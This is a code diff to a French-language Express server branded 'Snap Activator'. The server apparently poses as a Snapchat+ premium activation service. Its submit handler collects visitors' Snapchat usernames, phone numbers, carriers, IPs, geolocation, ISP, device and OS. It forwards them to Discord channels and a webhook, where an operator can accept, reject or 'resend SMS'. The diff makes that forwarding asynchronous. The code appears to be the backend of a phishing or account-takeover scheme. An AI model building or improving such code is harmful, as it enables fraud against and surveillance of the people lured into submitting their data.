@@ -235,9 +235,10 @@ app.post('/api/submit', async (req, res) => {
         return res.status(429).json({ error: `Trop de demandes, réessaie dans ${cfg.ratelimit_minutes} minutes.` });
     }
 
-    // Géolocalisation + détection VPN
-    const geo = await geolocateIP(ip);
-    if (geo && geo.proxy && cfg.bloquer_vpn !== false) {
+    // Géolocalisation + détection VPN (timeout 3s max, jamais bloquant)
+    let geo = null;
+    try { geo = await geolocateIP(ip); } catch (e) {}
+    if (geo && geo.proxy && cfg.bloquer_vpn === true) {
         return res.status(403).json({ error: 'VPN/proxy détecté. Désactive-le et réessaie.' });
     }
 
@@ -299,80 +300,80 @@ app.post('/api/submit', async (req, res) => {
         }
     }, cfg.timeout_minutes * 60 * 1000);
 
-    try {
-        await sendToDiscord(async () => {
-            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
-            const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
-            if (!mainChannel) throw new Error("Salon principal introuvable");
+    // Répondre immédiatement au client — Discord s'envoie en arrière-plan
+    res.json({ id });
 
-            // Champs dynamiques selon config
-            const expireAt = new Date(requestData.createdAt + cfg.timeout_minutes * 60 * 1000);
-            const expireStr = `<t:${Math.floor(expireAt.getTime() / 1000)}:R>`;
+    // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
+    const sendDiscordAsync = async () => {
+        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
+        const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
+        if (!mainChannel) {
+            await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
+            return;
+        }
 
-            const baseFields = [
-                { name: '👤 Pseudo',    value: `\`${snapchat}\``,  inline: true },
-                { name: '📞 Téléphone', value: `\`${phone}\``,     inline: true },
-                { name: '📡 Opérateur', value: operator,           inline: true },
-            ];
-            if (cfg.afficher_appareil) {
-                baseFields.push({ name: '📱 Appareil', value: device, inline: true });
-                baseFields.push({ name: '💻 OS',       value: os,     inline: true });
-            }
-            if (cfg.afficher_ip) {
-                baseFields.push({ name: '🌍 Localisation', value: geoStr, inline: true });
-                baseFields.push({ name: '🔌 FAI',          value: ispStr, inline: true });
-                baseFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
-            }
-            baseFields.push({ name: '⏰ Expire',  value: expireStr, inline: true });
-            baseFields.push({ name: '🆔 ID',      value: `\`${id.slice(0,8)}...\``, inline: true });
+        const expireAt  = new Date(requestData.createdAt + cfg.timeout_minutes * 60 * 1000);
+        const expireStr = `<t:${Math.floor(expireAt.getTime() / 1000)}:R>`;
 
-            const embed = new EmbedBuilder()
-                .setTitle('📱 Nouvelle demande Snapchat+')
-                .setDescription('> Un utilisateur veut activer son abonnement Premium.')
-                .setColor(0xFFFC00)
+        const baseFields = [
+            { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
+            { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
+            { name: '📡 Opérateur', value: operator,          inline: true },
+        ];
+        if (cfg.afficher_appareil) {
+            baseFields.push({ name: '📱 Appareil', value: device, inline: true });
+            baseFields.push({ name: '💻 OS',       value: os,     inline: true });
+        }
+        if (cfg.afficher_ip) {
+            baseFields.push({ name: '🌍 Localisation', value: geoStr, inline: true });
+            baseFields.push({ name: '🔌 FAI',          value: ispStr, inline: true });
+            baseFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
+        }
+        baseFields.push({ name: '⏰ Expire', value: expireStr,             inline: true });
+        baseFields.push({ name: '🆔 ID',     value: `\`${id.slice(0,8)}...\``, inline: true });
+
+        const embed = new EmbedBuilder()
+            .setTitle('📱 Nouvelle demande Snapchat+')
+            .setDescription('> Un utilisateur veut activer son abonnement Premium.')
+            .setColor(0xFFFC00)
+            .addFields(...baseFields)
+            .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+            .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
+            .setTimestamp();
+
+        const row = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
+            new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
+            new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
+        );
+
+        if (priorityChannel) {
+            const priorityEmbed = new EmbedBuilder()
+                .setTitle('👁️ PRIORITAIRE — Nouvelle demande')
+                .setDescription('> Lecture seule — les boutons sont dans le salon principal.')
+                .setColor(0xFF6600)
                 .addFields(...baseFields)
                 .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
-                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
+                .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
                 .setTimestamp();
+            await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
+        }
 
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
-                    new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
-                );
+        setTimeout(async () => {
+            try { await mainChannel.send({ embeds: [embed], components: [row] }); }
+            catch (e) { console.error('Erreur envoi salon principal:', e.message); }
+        }, cfg.delai_discord_sec * 1000);
 
-            // 1. Salon prioritaire EN PREMIER (si activé) + mention owner
-            if (priorityChannel) {
-                const priorityEmbed = new EmbedBuilder()
-                    .setTitle('👁️ PRIORITAIRE — Nouvelle demande')
-                    .setDescription('> Lecture seule — les boutons sont dans le salon principal.')
-                    .setColor(0xFF6600)
-                    .addFields(...baseFields)
-                    .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
-                    .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
-                    .setTimestamp();
-                await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
-            }
+        console.log(`✅ Demande #${id} envoyée à Discord`);
+    };
 
-            // 2. Salon principal après le délai configuré
-            setTimeout(async () => {
-                try {
-                    await mainChannel.send({ embeds: [embed], components: [row] });
-                } catch (e) {
-                    console.error('Erreur envoi salon principal (delayed):', e);
-                }
-            }, cfg.delai_discord_sec * 1000);
-
-            console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 10s)`);
+    if (botReady) {
+        sendDiscordAsync().catch(err => {
+            console.error('Erreur Discord async:', err.message);
+            sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ${ip}`);
         });
-
-        res.json({ id });
-    } catch (err) {
-        console.error('Erreur envoi Discord :', err);
-        // Fallback webhook
-        await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
-        res.json({ id }); // On répond quand même success
+    } else {
+        pendingMessages.push(() => sendDiscordAsync().catch(console.error));
     }
 });
 
